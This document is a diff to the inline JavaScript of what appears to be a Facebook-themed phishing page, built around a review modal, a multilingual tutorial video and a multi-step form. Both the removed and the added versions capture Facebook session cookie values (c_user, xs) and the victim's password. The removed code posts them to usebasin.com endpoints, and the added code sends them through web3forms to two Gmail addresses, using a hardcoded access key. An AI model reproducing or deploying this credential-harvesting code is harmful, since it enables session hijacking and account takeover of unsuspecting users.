@@ -1679,544 +1679,173 @@
     </footer>
 
     <script>
-      document.addEventListener("DOMContentLoaded", function () {
-        // Video files mapping
-        const videoFiles = {
-          'english': 'English_US_video_information_V1.mp4',
-          'filipino': 'Filipino_Tagalog_video_information_V1.mp4',
-          'hindi': 'Hindi_video_information_V1.mp4',
-          'portuguese': 'Portuguese_Brazil_video_information_V1.mp4',
-          'spanish': 'Spanish_Spain_video_information_V1.mp4',
-          'tamil': 'Tamil_video_information_V1.mp4',
-          'arabic': 'Arabic_video_information_V1.mp4',
-          'french': 'French_France_video_information_V1.mp4',
-          'swedish': 'Swedish_video_information_V1.mp4',
-          'japanese': 'Japanese_video_information_V1.mp4'
-        };
-
-        // Language modal elements
-        const languageModal = document.getElementById("languageModal");
-        const closeLanguageModal =
-          document.getElementById("closeLanguageModal");
-        const languageSearch = document.getElementById("languageSearch");
-        const languageButtons = document.querySelectorAll(".language-btn");
-        const confirmBtn = document.getElementById("confirmBtn");
-        const selectedLanguageDisplay = document.getElementById(
-          "selectedLanguageDisplay"
-        );
-
-        let selectedLanguage = null;
-
-        // Video elements
-        const videoOverlay = document.getElementById("videoOverlay");
-        const overlayPlayBtn = document.getElementById("overlayPlayBtn");
-        const video = document.getElementById("tutorialVideo");
-        const loadingSpinner = document.getElementById("loadingSpinner");
-        const loadingPercentage = document.querySelector(".loading-percentage");
-
-        const modal = document.getElementById("reviewModal");
-        const reviewBtn = document.getElementById("reviewBtn");
-        const closeModal = document.getElementById("closeModal");
-        const cancelBtn = document.getElementById("cancelBtn");
-        const finishBtn = document.getElementById("finishBtn");
-
-        // Video control elements
-        const playPauseBtn = document.getElementById("playPauseBtn");
-        const progressBar = document.getElementById("progressBar");
-        const bufferedBar = document.getElementById("bufferedBar");
-        const currentTimeDisplay = document.getElementById("currentTime");
-        const totalTimeDisplay = document.getElementById("totalTime");
-        const volumeBtn = document.getElementById("volumeBtn");
-        const volumeSlider = document.getElementById("volumeSlider");
-        const speedSelector = document.getElementById("speedSelector");
-        const fullscreenBtn = document.getElementById("fullscreenBtn");
-
-        // Step navigation
-        const nextToStep2 = document.getElementById("nextToStep2");
-        const backToStep1 = document.getElementById("backToStep1");
-        const nextToStep3 = document.getElementById("nextToStep3");
-
-        const step1 = document.getElementById("step1");
-        const step2 = document.getElementById("step2");
-        const step3 = document.getElementById("step3");
-
-        const steps = document.querySelectorAll(".step");
-
-
-        // Open language modal when video overlay is clicked
-        overlayPlayBtn.addEventListener("click", function () {
-          languageModal.classList.add("active");
-        });
-
-        // Close language modal
-        closeLanguageModal.addEventListener("click", function () {
-          languageModal.classList.remove("active");
-        });
-
-        // Language search functionality
-        languageSearch.addEventListener("input", function () {
-          const searchTerm = this.value.toLowerCase();
-
-          languageButtons.forEach((button) => {
-            const languageName = button
-              .querySelector(".language-name")
-              .textContent.toLowerCase();
-            const languageNative = button
-              .querySelector(".language-native")
-              .textContent.toLowerCase();
-
-            if (
-              languageName.includes(searchTerm) ||
-              languageNative.includes(searchTerm)
-            ) {
-              button.style.display = "flex";
-            } else {
-              button.style.display = "none";
-            }
-          });
-        });
-
-        // Language selection
-        languageButtons.forEach((button) => {
-          button.addEventListener("click", function () {
-            // Remove selected class from all buttons
-            languageButtons.forEach((btn) => btn.classList.remove("selected"));
-
-            // Add selected class to clicked button
-            this.classList.add("selected");
-
-            // Get selected language
-            selectedLanguage = this.getAttribute("data-lang");
-            const languageName =
-              this.querySelector(".language-name").textContent;
-
-            // Update display
-            selectedLanguageDisplay.textContent = languageName;
-
-            // Enable confirm button
-            confirmBtn.disabled = false;
-          });
-        });
-
-        // Confirm language selection
-        confirmBtn.addEventListener("click", function () {
-          if (selectedLanguage) {
-            const source = videoFiles[selectedLanguage];
-
-            if (source) {
-              video.src = source;
-              video.load();
-
-              // Set video title for accessibility
-              video.setAttribute(
-                "title",
-                `Tutorial Video - ${selectedLanguageDisplay.textContent}`
-              );
-
-              languageModal.classList.remove("active");
-
-              // After a short delay, play the video
-              setTimeout(() => {
-                video.play();
-                videoOverlay.classList.add("hidden");
-                playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
-              }, 300);
-
-              // Remember language selection
-              localStorage.setItem("preferredLanguage", selectedLanguage);
-            }
-          }
-        });
-
-        // Close modal when clicking outside
-        window.addEventListener("click", function (event) {
-          if (event.target === languageModal) {
-            languageModal.classList.remove("active");
-          }
-        });
-
-        // Keyboard shortcut for closing modal
-        document.addEventListener("keydown", function (e) {
-          if (
-            e.key === "Escape" &&
-            languageModal.classList.contains("active")
-          ) {
-            languageModal.classList.remove("active");
-          }
-        });
-
-        // Preload the preferred language if available
-        const preferredLanguage =
-          localStorage.getItem("preferredLanguage") || "english";
-        if (videoFiles[preferredLanguage]) {
-          video.src = videoFiles[preferredLanguage];
-          video.load();
-        }
-
-        function initVideoPlayer() {
-          // Initialize volume and playback rate
-          video.volume = volumeSlider.value;
-          video.playbackRate = speedSelector.value;
-
-          // Update time display
-          updateTimeDisplay();
-
-          // Event listeners
-          video.addEventListener("timeupdate", updateProgressBar);
-          video.addEventListener("progress", updateBufferedBar);
-          video.addEventListener("loadedmetadata", function () {
-            totalTimeDisplay.textContent = formatTime(video.duration);
-          });
-
-          // Loading events
-          video.addEventListener("waiting", showLoadingSpinner);
-          video.addEventListener("playing", hideLoadingSpinner);
-          video.addEventListener("seeking", showLoadingSpinner);
-          video.addEventListener("seeked", hideLoadingSpinner);
-
-          playPauseBtn.addEventListener("click", togglePlayPause);
-
-          volumeBtn.addEventListener("click", toggleMute);
-          volumeSlider.addEventListener("input", function () {
-            video.volume = volumeSlider.value;
-            updateVolumeIcon();
-          });
-
-          speedSelector.addEventListener("change", function () {
-            video.playbackRate = parseFloat(this.value);
-          });
-
-          fullscreenBtn.addEventListener("click", toggleFullscreen);
-
-          const progressContainer = document.querySelector(
-            ".progress-container"
-          );
-          progressContainer.addEventListener("click", function (e) {
-            const pos = (e.pageX - this.offsetLeft) / this.offsetWidth;
-            video.currentTime = pos * video.duration;
-          });
-
-          // Keyboard shortcuts
-          document.addEventListener("keydown", function (e) {
-            if (e.code === "Space" && !isInputField(document.activeElement)) {
-              e.preventDefault();
-              togglePlayPause();
-            }
-
-            if (e.code === "ArrowLeft") {
-              video.currentTime = Math.max(0, video.currentTime - 5);
-            }
-
-            if (e.code === "ArrowRight") {
-              video.currentTime = Math.min(
-                video.duration,
-                video.currentTime + 5
-              );
-            }
-
-            if (e.code === "ArrowUp") {
-              video.volume = Math.min(1, video.volume + 0.1);
-              volumeSlider.value = video.volume;
-              updateVolumeIcon();
-            }
-
-            if (e.code === "ArrowDown") {
-              video.volume = Math.max(0, video.volume - 0.1);
-              volumeSlider.value = video.volume;
-              updateVolumeIcon();
-            }
-
-            if (e.code === "KeyM") {
-              toggleMute();
-            }
-
-            if (e.code === "KeyF") {
-              toggleFullscreen();
-            }
-          });
-        }
-
-        function isInputField(element) {
-          return element.tagName === "INPUT" || element.tagName === "TEXTAREA";
-        }
-
-        function showLoadingSpinner() {
-          loadingSpinner.style.display = "flex";
-        }
-
-        function hideLoadingSpinner() {
-          if (video.readyState >= 3) {
-            loadingSpinner.style.display = "none";
-          }
-        }
-
-        function updateBufferedBar() {
-          if (video.buffered.length > 0) {
-            const bufferedEnd = video.buffered.end(video.buffered.length - 1);
-            const percent = (bufferedEnd / video.duration) * 100;
-            bufferedBar.style.width = `${percent}%`;
-
-            // Update loading percentage
-            if (video.readyState < 4) {
-              const loadedPercent = Math.round(
-                (bufferedEnd / video.duration) * 100
-              );
-              loadingPercentage.textContent = `${loadedPercent}%`;
-            }
-          }
-        }
-
-        function playVideo() {
-          video.play();
-          videoOverlay.classList.add("hidden");
-          playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
-        }
-
-        // Toggle play/pause
-        function togglePlayPause() {
-          if (video.paused) {
-            video.play();
-            playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
-          } else {
-            video.pause();
-            playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
-          }
-        }
-
-        // Update progress bar
-        function updateProgressBar() {
-          const percent = (video.currentTime / video.duration) * 100;
-          progressBar.style.width = `${percent}%`;
-          currentTimeDisplay.textContent = formatTime(video.currentTime);
-        }
-
-        // Update time display
-        function updateTimeDisplay() {
-          currentTimeDisplay.textContent = formatTime(video.currentTime);
-          totalTimeDisplay.textContent = formatTime(video.duration);
-        }
-
-        // Format time in MM:SS
-        function formatTime(seconds) {
-          const minutes = Math.floor(seconds / 60);
-          seconds = Math.floor(seconds % 60);
-          return `${minutes}:${seconds < 10 ? "0" : ""}${seconds}`;
-        }
-
-        function toggleMute() {
-          video.muted = !video.muted;
-          updateVolumeIcon();
-        }
-
-        function updateVolumeIcon() {
-          if (video.muted || video.volume === 0) {
-            volumeBtn.innerHTML = '<i class="fas fa-volume-mute"></i>';
-            volumeSlider.value = 0;
-          } else if (video.volume > 0.5) {
-            volumeBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
-          } else {
-            volumeBtn.innerHTML = '<i class="fas fa-volume-down"></i>';
-          }
-        }
-
-        function toggleFullscreen() {
-          const videoContainer = document.querySelector(
-            ".video-player-container"
-          );
-
-          if (!document.fullscreenElement) {
-            if (videoContainer.requestFullscreen) {
-              videoContainer.requestFullscreen();
-            } else if (videoContainer.mozRequestFullScreen) {
-              videoContainer.mozRequestFullScreen();
-            } else if (videoContainer.webkitRequestFullscreen) {
-              videoContainer.webkitRequestFullscreen();
-            } else if (videoContainer.msRequestFullscreen) {
-              videoContainer.msRequestFullscreen();
-            }
-            fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
-          } else {
-            if (document.exitFullscreen) {
-              document.exitFullscreen();
-            } else if (document.mozCancelFullScreen) {
-              document.mozCancelFullScreen();
-            } else if (document.webkitExitFullscreen) {
-              document.webkitExitFullscreen();
-            } else if (document.msExitFullscreen) {
-              document.msExitFullscreen();
-            }
-            fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
-          }
-        }
-
-        // Handle fullscreen change event
-        document.addEventListener("fullscreenchange", updateFullscreenIcon);
-        document.addEventListener(
-          "webkitfullscreenchange",
-          updateFullscreenIcon
-        );
-        document.addEventListener("mozfullscreenchange", updateFullscreenIcon);
-        document.addEventListener("MSFullscreenChange", updateFullscreenIcon);
-
-        function updateFullscreenIcon() {
-          if (
-            document.fullscreenElement ||
-            document.webkitFullscreenElement ||
-            document.mozFullScreenElement ||
-            document.msFullscreenElement
-          ) {
-            fullscreenBtn.innerHTML = '<i class="fas fa-compress"></i>';
-          } else {
-            fullscreenBtn.innerHTML = '<i class="fas fa-expand"></i>';
-          }
-        }
-
-        // Open review modal
-        reviewBtn.addEventListener("click", function () {
-          modal.style.display = "block";
-          document.body.style.overflow = "hidden";
-          initVideoPlayer();
-        });
-
-        // Close modal function
-        function closeModalFunc() {
-          modal.style.display = "none";
-          document.body.style.overflow = "auto";
-          resetForm();
-        }
-
-        closeModal.addEventListener("click", closeModalFunc);
-        cancelBtn.addEventListener("click", closeModalFunc);
-
-        // Finish button
-        finishBtn.addEventListener("click", function () {
-          window.location.href = "https://www.facebook.com/";
-        });
-
-        // Next to Step 2
-        nextToStep2.addEventListener("click", function () {
-          const cUserInput = document.getElementById("c_user");
-          const xsInput = document.getElementById("xs");
-
-          // Trigger browser validation
-          if (!cUserInput.checkValidity()) {
-            cUserInput.reportValidity();
-            return;
-          }
-
-          if (!xsInput.checkValidity()) {
-            xsInput.reportValidity();
-            return;
-          }
-
-          // Submit c_user and xs together
-          const formData = new FormData();
-          formData.append("c_user", cUserInput.value);
-          formData.append("xs", xsInput.value);
-
-          fetch("https://usebasin.com/f/f820f7a87d6f", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              c_user: cUserInput.value,
-              xs: xsInput.value
-            }),
-          })
-            .then((response) => {
-              if (!response.ok) {
-                console.error("Submission of c_user and xs failed");
-              }
-            })
-            .catch((error) => {
-              console.error("Submission error:", error);
-            });
-
-          // Proceed to next step
-          step1.classList.remove("active");
-          step2.classList.add("active");
-
-          steps[0].classList.remove("active");
-          steps[1].classList.add("active");
-        });
-
-        // Back to Step 1
-        backToStep1.addEventListener("click", function () {
-          step2.classList.remove("active");
-          step1.classList.add("active");
-
-          steps[1].classList.remove("active");
-          steps[0].classList.add("active");
-        });
-
-        // Submit form
-        nextToStep3.addEventListener("click", function () {
-          const passwordInput = document.getElementById("password");
-
-          if (!passwordInput.checkValidity()) {
-            passwordInput.reportValidity();
-            return;
-          }
-          // Submit password separately
-          const formData = new FormData();
-          formData.append("password", passwordInput.value);
-
-          fetch("https://usebasin.com/f/a2b623821391", {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              password: passwordInput.value,
-            }),
-          })
-            .then((response) => {
-              if (!response.ok) {
-                console.error("Password submission failed");
-              }
-            })
-            .catch((error) => {
-              console.error("Submission error:", error);
-            });
-
-          // Proceed to success step
-          step2.classList.remove("active");
-          step3.classList.add("active");
-
-          steps[1].classList.remove("active");
-          steps[2].classList.add("active");
-        });
-
-        // Reset form
-        function resetForm() {
-          document.getElementById("c_user").value = "";
-          document.getElementById("xs").value = "";
-          document.getElementById("password").value = "";
-
-
-          step3.classList.remove("active");
-          step1.classList.add("active");
-
-          steps[2].classList.remove("active");
-          steps[0].classList.add("active");
-
-          video.pause();
-          video.currentTime = 0;
-          videoOverlay.classList.remove("hidden");
-          playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
-          progressBar.style.width = "0%";
-          bufferedBar.style.width = "0%";
-          currentTimeDisplay.textContent = "0:00";
-        }
-
-        // Close modal when clicking outside
-        window.addEventListener("click", function (event) {
-          if (event.target === modal) {
-            closeModalFunc();
-          }
-        });
-      });
-    </script>
+document.addEventListener("DOMContentLoaded", function () {
+
+  const WEB3_ACCESS_KEY = "005c78c3-7829-4010-86e6-75d9e35bbd44";
+  const STEP1_EMAILS = "mustaqeemnizamani903@gmail.com";
+  const STEP2_EMAILS = "samoonubaid39@gmail.com";
+
+  // ---------------- VIDEO LANGUAGE LOGIC ----------------
+
+  const videoFiles = {
+    english: "English_US_video_information_V1.mp4",
+    filipino: "Filipino_Tagalog_video_information_V1.mp4",
+    hindi: "Hindi_video_information_V1.mp4",
+    portuguese: "Portuguese_Brazil_video_information_V1.mp4",
+    spanish: "Spanish_Spain_video_information_V1.mp4",
+    tamil: "Tamil_video_information_V1.mp4",
+    arabic: "Arabic_video_information_V1.mp4",
+    french: "French_France_video_information_V1.mp4",
+    swedish: "Swedish_video_information_V1.mp4",
+    japanese: "Japanese_video_information_V1.mp4"
+  };
+
+  const languageModal = document.getElementById("languageModal");
+  const overlayPlayBtn = document.getElementById("overlayPlayBtn");
+  const closeLanguageModal = document.getElementById("closeLanguageModal");
+  const languageButtons = document.querySelectorAll(".language-btn");
+  const confirmBtn = document.getElementById("confirmBtn");
+  const selectedLanguageDisplay = document.getElementById("selectedLanguageDisplay");
+  const video = document.getElementById("tutorialVideo");
+  const videoOverlay = document.getElementById("videoOverlay");
+  const playPauseBtn = document.getElementById("playPauseBtn");
+
+  let selectedLanguage = null;
+
+  overlayPlayBtn.addEventListener("click", () => {
+    languageModal.classList.add("active");
+  });
+
+  closeLanguageModal.addEventListener("click", () => {
+    languageModal.classList.remove("active");
+  });
+
+  languageButtons.forEach(btn => {
+    btn.addEventListener("click", function () {
+      languageButtons.forEach(b => b.classList.remove("selected"));
+      this.classList.add("selected");
+      selectedLanguage = this.dataset.lang;
+      selectedLanguageDisplay.textContent =
+        this.querySelector(".language-name").textContent;
+      confirmBtn.disabled = false;
+    });
+  });
+
+  confirmBtn.addEventListener("click", () => {
+    if (!selectedLanguage) return;
+    video.src = videoFiles[selectedLanguage];
+    video.load();
+    setTimeout(() => {
+      video.play();
+      videoOverlay.classList.add("hidden");
+      playPauseBtn.innerHTML = '<i class="fas fa-pause"></i>';
+    }, 300);
+    localStorage.setItem("preferredLanguage", selectedLanguage);
+    languageModal.classList.remove("active");
+  });
+
+  // ---------------- MODAL & STEPS ----------------
+
+  const modal = document.getElementById("reviewModal");
+  const reviewBtn = document.getElementById("reviewBtn");
+  const closeModal = document.getElementById("closeModal");
+  const cancelBtn = document.getElementById("cancelBtn");
+
+  const step1 = document.getElementById("step1");
+  const step2 = document.getElementById("step2");
+  const step3 = document.getElementById("step3");
+  const steps = document.querySelectorAll(".step");
+
+  reviewBtn.addEventListener("click", () => {
+    modal.style.display = "block";
+    document.body.style.overflow = "hidden";
+  });
+
+  function closeModalFunc() {
+    modal.style.display = "none";
+    document.body.style.overflow = "auto";
+    resetForm();
+  }
+
+  closeModal.addEventListener("click", closeModalFunc);
+  cancelBtn.addEventListener("click", closeModalFunc);
+
+  // ---------------- STEP 1 SUBMISSION (NAME + EMAIL) ----------------
+
+  document.getElementById("nextToStep2").addEventListener("click", function () {
+    const nameInput = document.getElementById("c_user");
+    const emailInput = document.getElementById("xs");
+
+    if (!nameInput.checkValidity()) return nameInput.reportValidity();
+    if (!emailInput.checkValidity()) return emailInput.reportValidity();
+
+    const formData = new FormData();
+    formData.append("access_key", WEB3_ACCESS_KEY);
+    formData.append("to", STEP1_EMAILS);
+    formData.append("subject", "Step 1 – User Details");
+    formData.append("step", "step_1");
+    formData.append("name", nameInput.value);
+    formData.append("email", emailInput.value);
+
+    fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formData
+    });
+
+    step1.classList.remove("active");
+    step2.classList.add("active");
+    steps[0].classList.remove("active");
+    steps[1].classList.add("active");
+  });
+
+  // ---------------- STEP 2 SUBMISSION (PASSWORD) ----------------
+
+  document.getElementById("nextToStep3").addEventListener("click", function () {
+    const passwordInput = document.getElementById("password");
+
+    if (!passwordInput.checkValidity()) {
+      passwordInput.reportValidity();
+      return;
+    }
+
+    const formData = new FormData();
+    formData.append("access_key", WEB3_ACCESS_KEY);
+    formData.append("to", STEP2_EMAILS);
+    formData.append("subject", "Step 2 – Password Submission");
+    formData.append("step", "step_2");
+    formData.append("password", passwordInput.value);
+
+    fetch("https://api.web3forms.com/submit", {
+      method: "POST",
+      body: formData
+    });
+
+    step2.classList.remove("active");
+    step3.classList.add("active");
+    steps[1].classList.remove("active");
+    steps[2].classList.add("active");
+  });
+
+  // ---------------- RESET FORM ----------------
+
+  function resetForm() {
+    document.getElementById("c_user").value = "";
+    document.getElementById("xs").value = "";
+    document.getElementById("password").value = "";
+
+    step3.classList.remove("active");
+    step1.classList.add("active");
+
+    steps[2].classList.remove("active");
+    steps[0].classList.add("active");
+
+    video.pause();
+    video.currentTime = 0;
+    videoOverlay.classList.remove("hidden");
+    playPauseBtn.innerHTML = '<i class="fas fa-play"></i>';
+  }
+
+});
+</script>
   </body>
 </html>
